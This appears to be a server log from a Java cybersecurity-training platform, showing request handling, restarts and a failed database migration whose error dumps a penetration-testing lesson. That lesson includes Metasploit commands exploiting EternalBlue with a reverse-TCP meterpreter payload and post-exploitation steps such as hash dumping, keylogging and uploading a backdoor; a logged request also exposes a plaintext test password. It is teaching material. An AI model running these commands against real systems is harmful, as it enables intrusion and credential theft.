	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Composition$1.onSuccess(Composition.java:62)
	at io.vertx.core.impl.future.FutureImpl$ListenerArray.onSuccess(FutureImpl.java:297)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Mapping.onSuccess(Mapping.java:40)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:88)
	at io.vertx.sqlclient.impl.QueryResultBuilder.tryComplete(QueryResultBuilder.java:32)
	at io.vertx.core.Promise.complete(Promise.java:66)
	at io.vertx.core.Promise.handle(Promise.java:51)
	at io.vertx.core.Promise.handle(Promise.java:29)
	at io.vertx.core.impl.future.FutureImpl$4.onSuccess(FutureImpl.java:176)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Composition$1.onSuccess(Composition.java:62)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.Transformation$1.onSuccess(Transformation.java:63)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:66)
	at io.vertx.core.impl.future.FutureImpl.addListener(FutureImpl.java:231)
	at io.vertx.core.impl.future.Transformation.onSuccess(Transformation.java:44)
	at io.vertx.core.impl.future.FutureBase.lambda$emitSuccess$0(FutureBase.java:60)
	at io.vertx.core.impl.ContextImpl.execute(ContextImpl.java:305)
	at io.vertx.core.impl.DuplicatedContext.execute(DuplicatedContext.java:181)
	at io.vertx.core.impl.future.FutureBase.emitSuccess(FutureBase.java:57)
	at io.vertx.core.impl.future.FutureImpl.tryComplete(FutureImpl.java:246)
	at io.vertx.core.impl.future.PromiseImpl.onSuccess(PromiseImpl.java:49)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:41)
	at io.vertx.core.impl.future.PromiseImpl.handle(PromiseImpl.java:23)
	at io.vertx.sqlclient.impl.command.CommandResponse.fire(CommandResponse.java:46)
	at io.vertx.sqlclient.impl.SocketConnectionBase.handleMessage(SocketConnectionBase.java:324)
	at io.vertx.pgclient.impl.PgSocketConnection.handleMessage(PgSocketConnection.java:114)
	at io.vertx.sqlclient.impl.SocketConnectionBase.lambda$init$0(SocketConnectionBase.java:137)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:335)
	at io.vertx.core.impl.ContextImpl.emit(ContextImpl.java:328)
	at io.vertx.core.net.impl.NetSocketImpl.handleMessage(NetSocketImpl.java:378)
	at io.vertx.core.net.impl.ConnectionBase.read(ConnectionBase.java:159)
	at io.vertx.core.net.impl.VertxHandler.channelRead(VertxHandler.java:153)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436)
	at io.vertx.pgclient.impl.codec.PgDecoder.fireCommandResponse(PgDecoder.java:52)
	at io.vertx.pgclient.impl.codec.PgCommandCodec.handleReadyForQuery(PgCommandCodec.java:137)
	at io.vertx.pgclient.impl.codec.PgDecoder.decodeReadyForQuery(PgDecoder.java:248)
	at io.vertx.pgclient.impl.codec.PgDecoder.channelRead(PgDecoder.java:107)
	at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:442)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166)
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:788)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
2026-03-12 00:36:02.845 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - POST /api/auth/register
2026-03-12 00:36:02.846 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - 🔐 POST /api/auth/register - Registration request received
2026-03-12 00:36:02.846 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.handler.AuthHandler - Request body: {
  "username" : "testuser1",
  "email" : "testuser@mail.com",
  "password" : "Test@123"
}
2026-03-12 00:36:02.847 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - Registration attempt for username: testuser1, email: testuser@mail.com
2026-03-12 00:36:02.847 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - Calling authService.register() for user: testuser1
2026-03-12 00:36:02.847 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - Attempting to register user: testuser@mail.com
2026-03-12 00:36:03.139 [vert.x-eventloop-thread-1] INFO  c.c.repository.UserRepository - Created user: testuser1
2026-03-12 00:36:03.139 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - User registered successfully: testuser@mail.com
2026-03-12 00:36:03.148 [vert.x-eventloop-thread-1] INFO  com.cyberskill.handler.AuthHandler - ✅ Registration successful for user: testuser1
2026-03-12 00:36:05.186 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /login
2026-03-12 00:36:05.186 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /login - Rendering login page
2026-03-12 00:36:05.186 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Login page rendered successfully
2026-03-12 00:36:05.270 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:36:05.291 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:36:15.210 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - POST /api/auth/login
2026-03-12 00:36:15.216 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - Login attempt for: testuser@mail.com
2026-03-12 00:36:15.429 [vert.x-eventloop-thread-1] INFO  com.cyberskill.service.AuthService - User logged in successfully: testuser@mail.com
2026-03-12 00:36:16.476 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 00:36:16.476 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 00:36:16.500 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
2026-03-12 00:36:16.579 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:36:16.616 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 00:36:16.631 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 00:36:16.686 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:36:48.329 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /learning/path/1
2026-03-12 00:36:48.329 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📚 GET /learning/path/1 - Rendering learning path
2026-03-12 00:36:48.361 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Learning path page rendered successfully
2026-03-12 00:36:48.458 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:36:48.497 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1
2026-03-12 00:36:48.518 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:36:48.520 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1/modules
2026-03-12 00:36:48.532 [vert.x-eventloop-thread-1] DEBUG c.c.repository.ModuleRepository - Found 5 modules for path 1
2026-03-12 00:36:48.532 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.ModuleService - Retrieved 5 modules for path 1
2026-03-12 00:36:48.603 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/1/sections
2026-03-12 00:36:48.611 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/2/sections
2026-03-12 00:36:48.613 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/3/sections
2026-03-12 00:36:48.614 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/4/sections
2026-03-12 00:36:48.627 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 3 sections for module 1
2026-03-12 00:36:48.630 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 3 sections for module 1
2026-03-12 00:36:48.636 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/5/sections
2026-03-12 00:36:48.642 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 5
2026-03-12 00:36:48.644 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 5
2026-03-12 00:36:48.714 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 2
2026-03-12 00:36:48.716 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 2
2026-03-12 00:36:48.733 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 3
2026-03-12 00:36:48.733 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 3
2026-03-12 00:36:48.744 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 4
2026-03-12 00:36:48.744 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 4
2026-03-12 00:36:56.469 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/1/lessons
2026-03-12 00:36:56.476 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 1
2026-03-12 00:36:56.476 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 1
2026-03-12 00:37:00.251 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/2/lessons
2026-03-12 00:37:00.253 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 2
2026-03-12 00:37:00.253 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 2
2026-03-12 00:37:02.721 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/3/lessons
2026-03-12 00:37:02.723 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 3
2026-03-12 00:37:02.723 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 3
2026-03-12 00:37:04.972 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /lesson/1
2026-03-12 00:37:04.976 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📖 GET /lesson/1 - Rendering lesson
2026-03-12 00:37:05.013 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Lesson page rendered successfully
2026-03-12 00:37:05.131 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:37:05.182 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/lessons/1
2026-03-12 00:37:05.235 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:37:05.242 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/sections/1/lessons
2026-03-12 00:37:05.251 [vert.x-eventloop-thread-1] DEBUG c.c.repository.LessonRepository - Found 1 lessons for section 1
2026-03-12 00:37:05.251 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LessonService - Retrieved 1 lessons for section 1
2026-03-12 00:37:25.301 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 00:37:25.301 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 00:37:25.301 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
2026-03-12 00:37:25.350 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:37:25.419 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 00:37:25.428 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 00:37:25.508 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:37:29.252 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 00:37:29.252 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 00:37:29.252 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
2026-03-12 00:37:29.299 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:37:29.330 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 00:37:29.334 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 00:37:29.371 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:37:33.820 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /learning/path/1
2026-03-12 00:37:33.820 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📚 GET /learning/path/1 - Rendering learning path
2026-03-12 00:37:33.820 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Learning path page rendered successfully
2026-03-12 00:37:33.887 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:37:33.962 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1
2026-03-12 00:37:33.972 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:37:34.000 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths/1/modules
2026-03-12 00:37:34.003 [vert.x-eventloop-thread-1] DEBUG c.c.repository.ModuleRepository - Found 5 modules for path 1
2026-03-12 00:37:34.004 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.ModuleService - Retrieved 5 modules for path 1
2026-03-12 00:37:34.067 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/1/sections
2026-03-12 00:37:34.072 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 3 sections for module 1
2026-03-12 00:37:34.078 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 3 sections for module 1
2026-03-12 00:37:34.084 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/2/sections
2026-03-12 00:37:34.091 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 2
2026-03-12 00:37:34.091 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 2
2026-03-12 00:37:34.097 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/3/sections
2026-03-12 00:37:34.102 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/4/sections
2026-03-12 00:37:34.104 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/modules/5/sections
2026-03-12 00:37:34.104 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 3
2026-03-12 00:37:34.104 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 3
2026-03-12 00:37:34.117 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 4
2026-03-12 00:37:34.118 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 4
2026-03-12 00:37:34.124 [vert.x-eventloop-thread-1] DEBUG c.c.repository.SectionRepository - Found 0 sections for module 5
2026-03-12 00:37:34.125 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.SectionService - Retrieved 0 sections for module 5
2026-03-12 00:38:01.395 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Stopping CyberSkill Platform...
2026-03-12 00:38:01.405 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform stopped
2026-03-12 00:38:20.125 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:38:20.130 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:38:20.243 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:38:20.393 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:38:20.394 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:38:20.394 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:38:20.651 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:38:20.752 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 3 migrations (execution time 00:00.081s)
2026-03-12 00:38:20.865 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 3
2026-03-12 00:38:20.870 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Schema "public" is up to date. No migration necessary.
2026-03-12 00:38:20.880 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Applied 0 database migration(s)
2026-03-12 00:38:20.883 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing database connection pool...
2026-03-12 00:38:20.913 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Database connection pool initialized
2026-03-12 00:38:20.918 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing repositories...
2026-03-12 00:38:20.926 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Repositories initialized
2026-03-12 00:38:20.928 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing services...
2026-03-12 00:38:20.945 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Services initialized
2026-03-12 00:38:20.947 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Initializing handlers...
2026-03-12 00:38:20.957 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Handlers initialized
2026-03-12 00:38:21.264 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform started successfully
2026-03-12 00:38:21.264 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Server listening on http://0.0.0.0:8080
2026-03-12 00:38:21.265 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ API available at http://0.0.0.0:8080/api
2026-03-12 00:38:21.265 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ Admin dashboard at http://0.0.0.0:8080/admin
2026-03-12 00:38:21.265 [vert.x-eventloop-thread-0] INFO  i.v.c.i.l.c.VertxIsolatedDeployer - Succeeded in deploying verticle
2026-03-12 00:38:24.489 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /dashboard
2026-03-12 00:38:24.489 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /dashboard - Rendering dashboard
2026-03-12 00:38:24.613 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Dashboard rendered successfully
2026-03-12 00:38:24.709 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:38:24.789 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /api/paths
2026-03-12 00:38:24.927 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:38:25.079 [vert.x-eventloop-thread-1] DEBUG c.cyberskill.service.LearningService - Retrieved 7 active learning paths
2026-03-12 00:38:28.374 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /login
2026-03-12 00:38:28.374 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET /login - Rendering login page
2026-03-12 00:38:28.401 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Login page rendered successfully
2026-03-12 00:38:28.501 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:38:28.525 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:38:31.391 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /
2026-03-12 00:38:31.391 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - 📄 GET / - Rendering home page
2026-03-12 00:38:31.435 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✅ Home page rendered successfully with 7 learning paths
2026-03-12 00:38:31.524 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /css/styles.css
2026-03-12 00:38:31.529 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /js/main.js
2026-03-12 00:38:31.604 [vert.x-eventloop-thread-1] DEBUG com.cyberskill.MainVerticle - GET /favicon.ico
2026-03-12 00:40:02.268 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Stopping CyberSkill Platform...
2026-03-12 00:40:02.275 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - ✓ CyberSkill Platform stopped
2026-03-12 00:52:42.953 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:52:42.956 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:52:43.061 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:52:43.180 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:52:43.181 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:52:43.181 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:52:43.393 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:52:43.461 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 7 migrations (execution time 00:00.048s)
2026-03-12 00:52:43.520 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 3
2026-03-12 00:52:43.552 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "4 - Enhanced Lesson Content"
2026-03-12 00:52:43.638 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "4 - Enhanced Lesson Content" failed! Changes successfully rolled back.
2026-03-12 00:52:43.642 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
